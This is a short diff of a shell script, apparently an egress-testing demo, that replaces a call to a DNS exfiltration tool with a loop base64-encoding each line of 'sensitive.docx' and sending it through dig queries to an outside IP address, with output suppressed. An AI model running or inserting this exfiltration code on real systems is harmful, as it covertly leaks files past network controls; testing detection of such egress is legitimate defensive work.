@@ -261,7 +261,11 @@ read -n 1 -s -r -p "Press the ANY key to continue."
 echo ""
 echo ""
 
-python ./dnsfilexfer/dns_send.py --server 54.89.49.208 --file sensitive.docx --indentifier egression -d egressi0n.com >&2
+while read LINE 
+do
+    encoded=$(echo -n $LINE | openssl base64) >& /dev/null
+    dig @54.89.49.208 $encoded >& /dev/null
+done < ./sensitive.docx
 
 echo ""
 
